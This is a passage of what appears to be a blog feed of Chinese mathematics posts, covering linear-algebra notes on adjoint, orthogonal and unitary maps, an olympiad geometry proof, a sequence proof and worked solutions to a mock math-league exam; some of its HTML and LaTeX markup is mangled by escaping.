\dots, v_m)(f_{1i}, \dots, f_{mi})^T, v_j\right&gt;_{\mathcal{V}}=\left&lt;\sum_{k=1}^mv_kf_{ki},v_j\right&gt;_{\mathcal{V}}=f_{ji}$,<br>$RHS=\left<u_i, (u_1,="" \dots,="" u_n)(g_{1j},="" g_{nj})^t\right="">_{\mathcal{U}}=\left<u_i,\sum_{k=1}^nu_kg_{kj}\right>_{\mathcal{V}}=g_{ij}$,<br>因此 $\forall 1\le i\le n, 1\le j\le m, f_{ji}=g_{ij}$ 成立. 即 $F=G^T$.</u_i,\sum_{k=1}^nu_kg_{kj}\right></u_i,></u_i,></li></ul></li></ul><h3 id="Definition-2-2"><a href="#Definition-2-2" class="headerlink" title="Definition 2"></a>Definition 2</h3><ul><li>给定欧氏空间 $\left(\mathcal{U}, \left&lt; \cdot, \cdot\right&gt;\right)$, $f\in\mathcal{Hom}\mathcal{(U, U)}$, 若 $\forall x,y\in\mathcal{U}$, 有<script type="math/tex">\left<f(x),y\right>=\left<x,f(y)\right>,</script><br>则称 $f$ 为 $\mathcal{U}$ 上的一个自伴变换(对称变换).</li></ul><h3 id="Property-3-1"><a href="#Property-3-1" class="headerlink" title="Property 3"></a>Property 3</h3><ul><li>$f\in\mathcal{Hom}\mathcal{(U, U)}$, $dim\mathcal{U}=n$.<ul><li>$1)$ $f$ 为对称变换 $\Longleftrightarrow$ $f=f^*$;</li><li>$2)$ $f$ 为对称变换 $\Longleftrightarrow$ $f$ 在任意标准正交基下的矩阵都是对称矩阵.</li></ul></li><li><strong><em>Proof:</em></strong><ul><li>$1)$ $\Longleftarrow:$ $\left<x,f(y)\right>=\left<x,f^*(y)\right>=\left<f(x),y\right>$;<br>$\quad\Longrightarrow: f^<em>(y)=\sum\limits_{i=1}^n\left&lt;v_i, f^</em>(y)\right&gt;v_i =\sum\limits_{i=1}^n\left<f(y), v_i\right="">v_i =\sum\limits_{i=1}^n\left<f(y), v_i\right="">v_i=f(y)$, $\forall y\in\mathcal{U}$, 故 $f=f^*$.</f(y),></f(y),></f(x),y\right></x,f^*(y)\right></x,f(y)\right></li><li>$2)$ $\Longleftarrow:$ 设 $f$ 在标准正交基下的矩阵为 $A$, 则 $f$ 对称 $\Longrightarrow$ $f=f^*$ $\Longrightarrow$ $A=A^T$ $\Longrightarrow$ $A$ 对称.<br>$\quad\Longrightarrow:$ 在 $Chapter 1$ 中已经证明.</li></ul></li></ul><h3 id="Example-1-2"><a href="#Example-1-2" class="headerlink" title="Example 1"></a>Example 1</h3><ul><li>$\mathbb{R}^{n\times n}\quad \left<a, b\right=""> = trace(B^TA)$ 是 $\mathbb{R}^{n\times n}$ 上的标准内积.<script type="math/tex; mode=display">f:\mathbb{R}^{n\times n}\rightarrow\mathbb{R}^{n\times n}\quad A\rightarrow A^T.</script></a,></li><li>考虑 $\left<f(a), b\right="">=trace(B^TA^T)=trace(AB)=trace(BA)$,<br>则 $\left<a, f^*(b)\right="">=trace(f^<em>(B)^TA)$, 那么 $f^</em>=f$.</a,></f(a),></li></ul><h3 id="Example-2-1"><a href="#Example-2-1" class="headerlink" title="Example 2"></a>Example 2</h3><ul><li>$\mathcal{C}_T^\infty(\mathbb{R})=\left\{f\in\mathcal{C}^\infty(\mathbb{R})\mid f(x)=f(x+T),\forall x\in\mathbb{R}\right\}$</li><li>$\left<f, g\right=""> = \int_a^b{f\left(x\right) g\left( x \right) dx}$ 是 $\mathcal{C}\left[a, b\right]$ 上的标准内积.<script type="math/tex; mode=display">D:\mathcal{C}_T^\infty(\mathbb{R})\rightarrow\mathcal{C}_T^\infty(\mathbb{R})\quad f\rightarrow f'.</script></f,></li><li>由 $\left<d(f), g\right="">=\int_0^Tf’(x)g(x)dx=\int_0^Tg(x)df(x)=fg|_0^T-\int_0^Tf(x)g’(x)dx=-\int_0^Tf(x)g’(x)dx=\left<f, -d(g)\right="">$, 那么 $d^*=-D$.</f,></d(f),></li></ul><h3 id="Definition-3-2"><a href="#Definition-3-2" class="headerlink" title="Definition 3"></a>Definition 3</h3><ul><li>给定欧氏空间 $\left(\mathcal{U}, \left&lt; \cdot, \cdot\right&gt;\right)$, $f\in\mathcal{Hom}\mathcal{(U, U)}$, 若 $\forall x,y\in\mathcal{U}$, 有<script type="math/tex">\left<f(x),f(y)\right>=\left<x,y\right>,</script><br>则称 $f$ 为 $\mathcal{U}$ 上的一个正交变换.</li></ul><h3 id="Property-4-1"><a href="#Property-4-1" class="headerlink" title="Property 4"></a>Property 4</h3><ul><li>$f\in\mathcal{Hom}\mathcal{(U, U)}$, 以下命题等价:<ul><li>$1)$ $f$ 为正交变换;</li><li>$2)$ $f$ 为保距变换;</li><li>$3)$ $f$ 把 $\mathcal{U}$ 的一组标准正交基映为另一组标准正交基.</li></ul></li></ul><h3 id="Property-5-1"><a href="#Property-5-1" class="headerlink" title="Property 5"></a>Property 5</h3><ul><li>$f\in\mathcal{Hom}\mathcal{(U, U)}$.<ul><li>$1)$ $f$ 为正交变换 $\Longleftrightarrow$ $f\circ f^<em>=f^</em>\circ f=id_{\mathcal{U}}$;</li><li>$2)$ $f$ 为保距变换 $\Longleftrightarrow$ $f$ 在任意标准正交基下的矩阵都是正交矩阵.</li></ul></li></ul><h3 id="Property-6-1"><a href="#Property-6-1" class="headerlink" title="Property 6"></a>Property 6</h3><ul><li>$Q$ 为实正交矩阵, $\lambda\in\mathbb{C}$ 是 $Q$ 的特征值 $\Longrightarrow$ $|\lambda|=1$.</li></ul><h3 id="Property-7"><a href="#Property-7" class="headerlink" title="Property 7"></a>Property 7</h3><ul><li>$Q$ 为 $n$ 阶正交矩阵, 存在 $n$ 阶正交矩阵 $X$, $\lambda\in\mathbb{C}$ 是 $Q$ 的特征值 $\Longrightarrow$ $|\lambda|=1$.</li><li>其中 $\theta_{i}$ 不是平角的倍数, $J$ 称为 $Q$ 的实相似标准型.</li></ul><h3 id="Tip-1-1"><a href="#Tip-1-1" class="headerlink" title="Tip 1"></a>Tip 1</h3><ul><li>给定 $n$ 维欧氏空间 $\mathcal{V}$ 及其上的正交变换 $f:\mathcal{V}\rightarrow\mathcal{V}$, 都存在着 $\mathcal{V}$ 的一组标准正交基, 使得 $f$ 在该组基下的矩阵形如<strong>Property 7</strong>中的 $J$.</li></ul><h3 id="Tip-2-1"><a href="#Tip-2-1" class="headerlink" title="Tip 2"></a>Tip 2</h3><ul><li>任意 $n$ 阶正交矩阵 $Q$ 都可以分解为不超过 $n$ 个反射矩阵的乘积.</li></ul><h2 id="Chapter-4-酉空间"><a href="#Chapter-4-酉空间" class="headerlink" title="Chapter 4 酉空间"></a>Chapter 4 酉空间</h2><h3 id="Question-1-3"><a href="#Question-1-3" class="headerlink" title="Question 1"></a>Question 1</h3><ul><li>能否在复向量空间 $\mathcal{V}$ 上定义内积?</li><li>注意到如果不对内积的定义进行修改, 考虑内积 $\left<ia, ia\right="">$, 那么正定性与双线性性是彼此矛盾的.</ia,></li></ul><h3 id="Definition-1-3"><a href="#Definition-1-3" class="headerlink" title="Definition 1"></a>Definition 1</h3><ul><li>给定线性空间$\mathcal{V}/\mathbb{C}$, $\left&lt;\cdot, \cdot\right&gt;:\mathcal{V}\times\mathcal{V}\rightarrow\mathbb{C}$, 满足$\forall a,b\in\mathcal{V}$, 有<ul><li>$a)$ 共轭对称性: $\left<a, b\right=""> = \overline{\left<b, a\right="">}$;</b,></a,></li><li>$b)$ 线性性和共轭线性性: $\left<k_1a_1+k_2a_2, b\right=""> = k_1\left<a_1, b\right=""> + k_2\left<a_2, b\right="">$;<br>$\quad\qquad\qquad\qquad\qquad\left<a, k_1b_1+k_2b_2\right=""> = \overline{k_1}\left<a, b_1\right=""> + \overline{k_2}\left<a, b_2\right="">$;</a,></a,></a,></a_2,></a_1,></k_1a_1+k_2a_2,></li><li>$c)$ 正定性: $\left<a, a\right=""> \ge 0$, 取等当且仅当 $a = 0$.</a,></li></ul></li><li>则称二元函数是 $\mathcal{V}$ 上的一个内积, $\mathcal{V}$ 是一个酉空间.</li></ul><h3 id="Example-1-3"><a href="#Example-1-3" class="headerlink" title="Example 1"></a>Example 1</h3><ul><li>$\mathbb{C}^n\quad \left<a, b\right=""> = \overline{b}^Ta$ 是 $\mathbb{C}^n$上的标准内积.<br>$D$ 是对角元素均为正的对角阵, $\left<a, b\right=""> = \overline{b}^TDa$.</a,></a,></li></ul><h3 id="Example-2-2"><a href="#Example-2-2" class="headerlink" title="Example 2"></a>Example 2</h3><ul><li>$\mathbb{C}^{m\times n}\quad \left<a, b\right=""> = trace(\overline{B}^TA)$ 是 $\mathbb{C}^{m\times n}$ 上的标准内积.</a,></li></ul><h3 id="Property-1-3"><a href="#Property-1-3" class="headerlink" title="Property 1"></a>Property 1</h3><ul><li><p>$(Cauchy-Schwarz\ Inequality)$</p><p>$\left| \left<a, b\right=""> \right|$ ≤ $\left| a \right|\cdot \left| b \right| $.</a,></p></li><li><p>等号成立当且仅当 $a, b$ 共线, 其中 $a, b\in$ 酉空间 $\mathcal{V}$.</p></li></ul><h3 id="Definition-2-3"><a href="#Definition-2-3" class="headerlink" title="Definition 2"></a>Definition 2</h3><ul><li>给定酉空间 $\left(\mathcal{V}, \left&lt; \cdot, \cdot\right&gt;_{\mathcal{V}}\right)$, $f, g\in\mathcal{Hom}\mathcal{(V, V)}$, 使得 $\forall x, y\in\mathcal{V}$, 有<script type="math/tex">\left<f(x),y\right>=\left<x,g(y)\right>,</script></li><li>则称 $g$ 为 $f$ 的共轭映射或伴随映射, $g=f^*$.</li></ul><h3 id="Question-2-2"><a href="#Question-2-2" class="headerlink" title="Question 2"></a>Question 2</h3><ul><li>如何从矩阵的角度理解伴随映射?<ul><li>$1)$ 基本情形: 考虑 $\mathcal{U}=\mathbb{C}^n, \mathcal{V}=\mathbb{C}^m$ 及其上的标准内积,<script type="math/tex; mode=display">f\in\mathcal{Hom}\mathcal{(U, V)}\xrightarrow{\quad\quad\quad\quad}A\in\mathbb{C}^{m\times n}, x\rightarrow Ax, x\in\mathbb{R}^n;</script><script type="math/tex; mode=display">f^*\in\mathcal{Hom}\mathcal{(V, U)}\xrightarrow{\quad\quad\quad\quad}B\in\mathbb{C}^{n\times m}, y\rightarrow By, y\in\mathbb{R}^n.</script>$\forall x\in\mathbb{R}^n, y\in\mathbb{R}^m$, 有 $\overline{y}^TAx=\left<ax,y\right>=\left<f(x),y\right>=\left<x,f^*(y)\right>=\left<x,by\right>=\overline{y}^T\overline{B}^Tx$,<br>进而 $A=\overline{B}^T, B=\overline{A}^T:=A^H$ 成立.</x,by\right></x,f^*(y)\right></f(x),y\right></ax,y\right></li><li>$2)$ 一般情形: 假定 $\mathcal{U},\mathcal{V}$ 的一组标准正交基分别为<script type="math/tex; mode=display">u_1, u_2, \dots, u_n, v_1, v_2, \dots, v_m.</script>设 $f:\mathcal{U}\rightarrow\mathcal{V}$ 在两组基下表示矩阵为 $F$, 则 $f^*:\mathcal{V}\rightarrow\mathcal{U}$ 的表示矩阵为 $F^H$.</li></ul></li></ul><h3 id="Definition-2-4"><a href="#Definition-2-4" class="headerlink" title="Definition 2"></a>Definition 2</h3><ul><li>给定酉空间 $\mathcal{V}$, 其上的变换 $f\in\mathcal{Hom}\mathcal{(V, V)}$ 以及相应的矩阵 $A$. 使得 $\forall x, y\in\mathcal{V}$, 有<ul><li>$a)$ (自伴变换) $\left<f(x),y\right>=\left<x,f(y)\right> \leftrightarrow f=f^* \leftrightarrow A=A^H$;</x,f(y)\right></f(x),y\right></li><li>$b)$ (酉变换) $\left<f(x),f(y)\right>=\left<x,y\right> \leftrightarrow ff^<em>=f^</em>f=id_{\mathcal{V}} \leftrightarrow AA^H=A^HA=I$;</x,y\right></f(x),f(y)\right></li><li>$c)$ (正规变换) $ff^<em>=f^</em>f \leftrightarrow AA^H=A^HA$.</li></ul></li></ul><h3 id="Property-2-2"><a href="#Property-2-2" class="headerlink" title="Property 2"></a>Property 2</h3><ul><li>$\mathcal{V}$ 为酉空间, $\left(e_1, \dots, e_n\right)$ 为标准正交基, $U$ 为 $n$ 阶方阵, $(u_1, \dots, u_n) = (e_1, \dots, e_n) U$, 则<br>$(u_1, \dots, u_n)$为一组标准正交基 $\Longleftrightarrow U$ 是酉矩阵 $\Longleftrightarrow U$ 的列向量是 $\mathbb{C}^n$ 的标准正交基.</li></ul><h3 id="Property-3-2"><a href="#Property-3-2" class="headerlink" title="Property 3"></a>Property 3</h3><ul><li>酉空间 $\mathcal{V}:(u_1, \dots, u_n)=(e_1, \dots, e_n)U$, 其中 $(u_1, \dots, u_n), (e_1, \dots, e_n)$ 是 $\mathcal{V}$ 的标准正交基.</li><li>线性映射 $f:\mathcal{V}\rightarrow\mathcal{V}$, 记 $\sigma_{e_1,\dots, e_n}(f) = F$, 则 $\sigma_{u_1,\dots, u_n}(f) = U^{-1}FU = U^HFU$.</li></ul><h3 id="Tip-1-2"><a href="#Tip-1-2" class="headerlink" title="Tip 1"></a>Tip 1</h3><ul><li>$A, B$ 为复矩阵, 若存在酉矩阵 $U$, 使得 $U^HAU=B$, 则称 $A, B$ 酉相似.</li></ul><h3 id="Definition-3-3"><a href="#Definition-3-3" class="headerlink" title="Definition 3"></a>Definition 3</h3><ul><li>对任意 $n$ 阶方阵 $A$, 存在酉矩阵 $U$, 使得 $U^HAU=T$, $T$ 为上三角矩阵, 且对角元为 $A$ 的特征值.</li><li>通过选取 $U$, 可以将 $T$ 的对角元实现任意顺序排列.</li></ul><h3 id="Property-3-3"><a href="#Property-3-3" class="headerlink" title="Property 3"></a>Property 3</h3><ul><li>$Hermite$ 矩阵的特征值都是实数.</li><li>酉矩阵的特征值都是模长为1的复数.</li></ul>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Algebra </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代数一隅</title>
      <link href="/2022/09/12/dai-shu-yi-yu-09-12/"/>
      <url>/2022/09/12/dai-shu-yi-yu-09-12/</url>
      
        <content type="html"><![CDATA[<p><strong>Problem:</strong></p><p>正项数列 $\{a_n\}$ 满足 $a_{n+1}=\frac{n}{a_n}+1$. 求证: $\exists\thinspace k\in N$, 对 $\forall\thinspace n&gt;k$, 有 $a_{n+2}&gt;a_n$.</p><p><strong>Proof:</strong></p><script type="math/tex; mode=display">a_2=\frac{1}{a_1}+1>1,</script><script type="math/tex; mode=display">a_3=\frac{2}{a_2}+1\in(1, 3),</script><script type="math/tex; mode=display">a_4=\frac{3}{a_3}+1\in(2, 4),</script><script type="math/tex; mode=display">a_5=\frac{4}{a_4}+1\in(2, 3),</script><script type="math/tex; mode=display">a_6=\frac{5}{a_5}+1\in(\frac{8}{3}, \frac{7}{2}).</script><p>下证: 当 $n\ge 6$ 时, $\sqrt{n}&lt;a_n&lt;\sqrt{n+1}+1.$</p><p>$(1)$ 当 $n=6$ 时, 显然有 $\sqrt{6}&lt;\frac{8}{3}&lt;a_6&lt;\frac{7}{2}&lt;\sqrt{7}+1$ 成立.</p><p>$(2)$ 假设命题对 $n$ 成立,</p><p>那么 $a_{n+1}&lt;\frac{n}{\sqrt{n}}+1=\sqrt{n}+1&lt;\sqrt{n+2}+1$,</p><p>且 $a_{n+1}&gt;\frac{n}{\sqrt{n+1}+1}+1=\sqrt{n+1}$.</p><p>由$(1), (2)$可知,</p><script type="math/tex; mode=display">\mbox{当}\thinspace n\ge 6\thinspace\mbox{时}, \sqrt{n}<a_n<\sqrt{n+1}+1.</script><p>从而 $(a_n-1)^2&lt;n+1,$ 即 $a_n^2-2a_n-n&lt;0, \forall\thinspace n\ge 6.$</p><p>当 $n \ge 6$ 时, 有</p><script type="math/tex; mode=display">a_{n+2}=\frac{n+1}{\frac{n}{a_n}+1}+1>a_n\mbox{成立}.</script>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Algebra </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几何一窥</title>
      <link href="/2022/09/09/ji-he-yi-kui-09-09/"/>
      <url>/2022/09/09/ji-he-yi-kui-09-09/</url>
      
        <content type="html"><![CDATA[<p><strong>Problem:</strong></p><p>设$O, H$分别为$\triangle ABC$的外心和垂心, 过$AH$的中点$M$且垂直于$BM$的直线与$AC$交于$P$. 求证: $OP\parallel BC$.</p><p><strong>Proof:</strong></p><p>作$\odot O$直径$AD$, 取边$BC$中点$E$;</p><p>连接$BH$并延长交边$AC$于点$F$, 那么$BF\perp AC$;</p><p>延长$AH$交$\odot O$于点$H’$, 那么$AH’\perp BC$;</p><p>连接$BH’, CD$交于点$G$.</p><p>由垂心定理, 知$AH=2OE$, 连接$DH$交直线$OE$于点$E’$, </p><p>由$OE’\parallel AH,\thinspace AO=OD$, 知$OE’$为$\triangle ADH$的中位线, </p><p>故$OE’=\frac{1}{2}AH=OE$, 从而点$E, E’$重合, 即$D, E, H$三点共线. </p><p>连接$BD, DH’, H’C$,</p><p>由$\angle BAD=\angle BAO=90^{\circ}-\frac{1}{2}\angle AOB=90^{\circ}-\angle ACB=\angle HAC=\angle H’AC$,</p><p>知$BD=CH’$, 四边形$BDHC’$为等腰梯形, 由对称性知$O, E, G$三点共线.</p><p>由$\angle BH’H=\angle AH’B=\angle ACB=\angle BHH’$, 故$BH=BH’$.</p><p>又$BC\perp HH’$, 故$H, H’$关于直线$BC$对称.</p><p>要证明$OP\parallel BC \Longleftrightarrow \angle APO=\angle ACB$. </p><p>$(a)$ 先证明$\angle ACB=\angle OGC$.<br>\begin{equation<em>}<br>\begin{aligned}<br>\angle OGC &amp;= \angle GOD+\angle GDO\\<br>&amp;=\angle H’AD+\angle CDA\\<br>&amp;=(\angle BAC-\angle BAO-\angle CAH)+\angle CBA \\<br>&amp;=\angle BAC-(90^\circ-\frac{1}{2}\angle AOB)-(90^\circ-\angle ACB)+\angle CBA \\<br>&amp;=2\angle ACB+\angle ABC+\angle BAC-180^\circ\\<br>&amp;=\angle ACB.<br>\end{aligned}<br>\end{equation</em>}</p><p>$(b)$ 再证明$\angle APO=\angle OGC\Longleftrightarrow O, P, G, C$四点共圆.</p><p>连接边$OH’$, 注意到<br>\begin{equation<em>}<br>\begin{aligned}<br>\angle OH’C &amp;= \angle OH’A+\angle AH’C\\<br>&amp;=\angle OAH’+\angle ADC\\<br>&amp;=\angle DOG+\angle ODG\\<br>&amp;=\angle OGC,<br>\end{aligned}<br>\end{equation</em>}</p><p>故<br>\begin{equation}<br>O, H’, G, C\thinspace\mbox{四点共圆}. \tag{1}<br>\end{equation}</p><p>又注意到$\angle BMP=\angle BFP=90^\circ$, 故$B, M, P, F$四点共圆.</p><p>连接边$FM$, 直角$\triangle AHF$中, $M$为边$AH$中点, 故</p><script type="math/tex; mode=display">\angle BFM=\angle HFM=\angle FHM=\angle BHH'=\angle BH'M,</script><p>即$B, M, H’, F$四点共圆, 从而$B, M, H’, F, P$五点共圆.</p><p>那么连接$H’P$, 由$B, F, P, H’$四点共圆, 知$\angle H’PC=\angle H’BH$.</p><p>又因为<br>\begin{equation<em>}<br>\begin{aligned}<br>\angle H’OC &amp;= 2\angle H’AC\\<br>&amp;=2\angle H’BC\\<br>&amp;=\angle HBC+\angle H’BC\\<br>&amp;=\angle HBH’.<br>\end{aligned}<br>\end{equation</em>}</p><p>故$\angle H’OC=\angle H’BH=\angle H’PC$, 即<br>\begin{equation}<br>O, H’, P, C\thinspace\mbox{四点共圆}. \tag{2}<br>\end{equation}</p><p>由$(1), (2)$知, $O, H’, P, G, C$五点共圆.</p><p>因而$\angle APO=\angle OGC$得证.</p><p>综上, 由$(a), (b)$知$\angle ACB=\angle OGC=\angle APO$成立, 进而有$OP\parallel BC$. </p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301948297.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Geometry </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高联一试模拟试题解答</title>
      <link href="/2022/09/05/gao-lian-yi-shi-mo-ni-shi-ti-jie-da/"/>
      <url>/2022/09/05/gao-lian-yi-shi-mo-ni-shi-ti-jie-da/</url>
      
        <content type="html"><![CDATA[<h1 id="全国高中数学联合竞赛一试模拟试题"><a href="#全国高中数学联合竞赛一试模拟试题" class="headerlink" title="全国高中数学联合竞赛一试模拟试题"></a>全国高中数学联合竞赛一试模拟试题</h1><h4 id="一、填空题"><a href="#一、填空题" class="headerlink" title="一、填空题"></a><strong>一、填空题</strong></h4><p><strong>1. </strong> 若点$P(x, y)$在直线$x+3y-3=0$上移动, 则函数$f(x, y)=3^x+9^y$的最小值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>答案 </strong> $5(\frac{27}{4})^{\frac{1}{5}}$.</p><p><strong>解析 </strong> 点$P(x, y)$在直线$x+3y-3=0$上, 则有$y=\frac{3-x}{3}$, 所以</p><p>\begin{equation*}</p><p>\begin{aligned}</p><p>f(x)&amp;=3^x+9^{\frac{3-x}{3}}=3^x+3^{2-\frac{2x}{3}} \\</p><p>&amp;=\frac{1}{2}\cdot 3^x + \frac{1}{2}\cdot 3^x + 3^{1-\frac{2x}{3}} + 3^{1-\frac{2x}{3}} + 3^{1-\frac{2x}{3}} \\</p><p>&amp;\ge 5\cdot\sqrt[5]{\frac{1}{2}\cdot 3^x\cdot\frac{1}{2}\cdot 3^x\cdot 3^{1-\frac{2x}{3}}\cdot 3^{1-\frac{2x}{3}}\cdot 3^{1-\frac{2x}{3}}} \\</p><p>&amp;=5(\frac{27}{4})^{\frac{1}{5}}.</p><p>\end{aligned}    </p><p>\end{equation*}</p><p><strong>2. </strong> 已知方程$x^2+(4+i)x+4+ai=0 ($其中$a\in\mathbb{R})$有实根$b$, 且$z=a+b i$, 那么复数$z=\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>答案 </strong> $2-2i$.</p><p><strong>解析 </strong> 将$x=b$代入方程, 有$(b+2)^2+(a+b)i=0$.  </p><p>分别令实部和虚部为零可得$a=2, b=-2$, 所以$z=2-2i$.</p><p><strong>3. </strong> 若实数$x, y$满足$\tan x=x, \tan y=y$, 且$|x|\ne |y|$, 则$\frac{\sin (x+y)}{x+y}-\frac{\sin (x-y)}{x-y}$的值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>答案 </strong> $0$.</p><p><strong>解析 </strong> 由题意, 得</p><script type="math/tex; mode=display">\frac{\sin (x+y)}{x+y}=\frac{\sin (x+y)}{\tan x+\tan y}=\frac{\sin (x+y)}{\frac{\sin x}{\cos x}+\frac{\sin y}{\cos y}}=\cos x\cdot\cos y,</script><p>同理</p><script type="math/tex; mode=display">\frac{\sin(x-y)}{x-y} = \frac{\sin(x-y)}{\tan x-\tan y} = \frac{\sin(x-y)}{\frac{\sin x}{\cos x}-\frac{\sin y}{\cos y}}=\cos x \cdot\cos y,</script><p>故</p><script type="math/tex; mode=display">\frac{\sin (x+y)}{x+y}-\frac{\sin (x-y)}{x-y}=0.</script><p><strong>4. </strong> $\sum_{k=1}^{2022} \left[\sqrt[4]{\frac{2022}{k}}\right]$的值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>答案 </strong> $2183$.</p><p><strong>解析 </strong> 所求的值为曲线$y=\sqrt[4]{\frac{2022}{x}}$与$x&gt;0, y&gt;0$所围区域内整点的数目.</p><p>将按列计数改为按行计数, 所求为</p><script type="math/tex; mode=display">\sum_{k=1}^{6}\left[\frac{2022}{k^4}\right]=2022+126+24+7+3+1=2183.</script><p><strong>5. </strong> 在数列${\left\{a_n\right\}}$中, $a_n=\frac{1}{(\sqrt{n-1}+\sqrt{n})(\sqrt{n}+\sqrt{n+1})(\sqrt{n-1}+\sqrt{n+1})}$, 则数列$\left\{ a_n \right\}$前2022项的和为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>答案 </strong> $\frac{1}{2}(1+\sqrt{2022}-\sqrt{2023})$.</p><p><strong>解析 </strong> \begin{equation*}</p><p>\begin{aligned}</p><p>a_n&amp;=\frac{1}{(\sqrt{n-1}+\sqrt{n})(\sqrt{n}+\sqrt{n+1})(\sqrt{n-1}+\sqrt{n+1})} \\</p><p>&amp;=\frac{1}{\sqrt{n-1}+\sqrt{n+1}}-\frac{1}{\sqrt{n}+\sqrt{n+1}} \\</p><p>&amp;=\frac{\sqrt{n+1}-\sqrt{n-1}}{2}-\sqrt{n+1}+\sqrt{n} \\</p><p>&amp;=\frac{(\sqrt{n}-\sqrt{n+1})+(\sqrt{n}-\sqrt{n-1})}{2}.</p><p>\end{aligned}    </p><p>\end{equation*}</p><p>所以</p><p>\begin{equation*}</p><p>\begin{aligned}</p><p>S_{2022}&amp;=\frac{1}{2}(1-\sqrt{2}+\sqrt{2}-\sqrt{3}+\cdots +\sqrt{2022}-\sqrt{2023})+\frac{1}{2}(1-0+\sqrt{2}-1+\cdots +\sqrt{2022}-\sqrt{2021}) \\</p><p>&amp;=\frac{1}{2}(1-\sqrt{2023})+\frac{1}{2}\sqrt{2022} \\</p><p>&amp;=\frac{1}{2}(1+\sqrt{2022}-\sqrt{2023}).</p><p>\end{aligned}    </p><p>\end{equation*}</p><p><strong>6. </strong> 过四面体$ABCD$的顶点$D$作半径为1的球, 该球与四面体$ABCD$的外接球切于点$D$, 且与面$ABC$相切. 若$AD=2\sqrt{3}, \angle BAD=\angle CAD=45^\circ, \angle BAC=60^\circ$, 则四面体的外接球半径$r$为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>答案 </strong> $3$.</p><p><strong>解析 </strong> 过点$D$作平面$ABC$的垂线, 垂足为$H$; 作$DE\bot AB$, 垂足为$E$; 作$DF\bot AC$, 垂足为$F$.</p><p>那么$HE\bot AB$, $HF\bot AC$, 且$AE=AF=AD\cos45^\circ =\sqrt{6}.$</p><p>由$\triangle AEH\cong\triangle AFH$, 得$\angle HAE=30^\circ$, $AH=\frac{AE}{\cos 30^\circ}=2\sqrt{2}, DH=\sqrt{AD^2-AH^2}=2,$ </p><p>故$DH$为半径是$1$的球的直径,</p><p>那么四面体$ABCD$的外接球的球心$O$在$DH$的延长线上, 有</p><script type="math/tex; mode=display">r^2=(r-2)^2+(2\sqrt{2})^2, \Rightarrow r=3.</script><p><strong>7. </strong> 已知双曲线$\frac{x^2}{a^2}-\frac{y^2}{b^2}=1$的左顶点为$A$, 右焦点为$F$. 设$P$为第一象限中双曲线上的任意一点, 若总有$\angle PFA=2\angle FAP$, 则双曲线的离心率为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>答案 </strong> $2$.</p><p><strong>解析 </strong> 由题设, 可以取双曲线上的点$P$, 使$PF\bot x$轴, 得$P(c, y)$, 则$\frac{c^2}{a^2}-\frac{y^2}{b^2}=1$, </p><p>故$y^2=\frac{b^4}{a^2}$.因为$y&gt;0$, 所以$y=\frac{b^2}{a}=\frac{c^2-a^2}{a}$.</p><p>由$\angle PFA=2\angle FAP =\frac{\pi}{2},$得$\triangle AFP$是等腰三角形, 有$AF=PF$, </p><p>即$a+c=\frac{c^2-a^2}{a}$, 整理得</p><script type="math/tex; mode=display">c^2-ac-2a^2=0, \Rightarrow e^2-e-2=0.</script><p>又$e&gt;1,$解得$e=2$.</p><p><strong>8. </strong> 正整数集合$A_k$的最小元素为1, 最大元素为2022, 并且各元素可以从小到大排成一个公差为$k$的等差数列, 则并集$A_{43}\cup A_{47}$中的元素个数为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>答案 </strong> $90$.</p><p><strong>解析 </strong> 用$|A_k|$表示集合$A_k$的元素个数.</p><p>设$|A_k|=n+1$, 由$2022=1+nk$, 得$n=\frac{2021}{k}$, 于是</p><script type="math/tex; mode=display">|A_{43}|=\frac{2021}{43}+1=48, |A_{47}|=\frac{2021}{47}+1=44, |A_{43}\cap A_{47}|=|A_{2021}|=\frac{2021}{2021}+1=2,</script><p>故</p><script type="math/tex; mode=display">|A_{43}\cup A_{47}|=|A_{43}|+|A_{47}|-|A_{43}\cap A_{47}|=48+44-2=90.</script><h4 id="二、解答题"><a href="#二、解答题" class="headerlink" title="二、解答题"></a><strong>二、解答题</strong></h4><p><strong>9. </strong> 已知实数$x, y$都在区间$(-2, 2)$内, 且$xy=-1$, 常数$a\in (2, 8)$, 求函数$f(x, y)=\frac{4}{4-x^2}+\frac{a^2}{a^2-y^2}$的最小值.</p><p><strong>解析 </strong> 设$m=\frac{x}{2}, n=-\frac{y}{a}, m,n\in (-1, 1), mn=\frac{1}{2a}, f(x, y)=\frac{1}{1-m^2}+\frac{1}{1-n^2}$.</p><p>由柯西不等式, 得</p><script type="math/tex; mode=display">(\frac{1}{1-m^2}+\frac{1}{1-n^2})[(1-m^2)+(1-n^2)]\ge (1+1)^2=4,</script><p>所以</p><script type="math/tex; mode=display">f(x,y)\ge\frac{4}{2-(m^2+n^2)}\ge\frac{4}{2-2mn}=\frac{4a}{2a-1},</script><p>当$m=n=\frac{1}{\sqrt{2a}},$即$x=\sqrt{\frac{2}{a}}, y=-\sqrt{\frac{a}{2}}\in (-2, 2)$(注意$a\in (2, 8))$时, 不等式中的等号可成立.</p><p>所以函数$f(x, y)$的最小值为$\frac{4a}{2a-1}$.</p><p><strong>10. </strong> 椭圆$C:\frac{x^2}{a^2}+\frac{y^2}{b^2}=1(a&gt;b&gt;0)$的左、右焦点分别为$F_1$、$F_2$, 右顶点为$A$, $P$为椭圆上任意一点, 已知$\overrightarrow{PF_1} 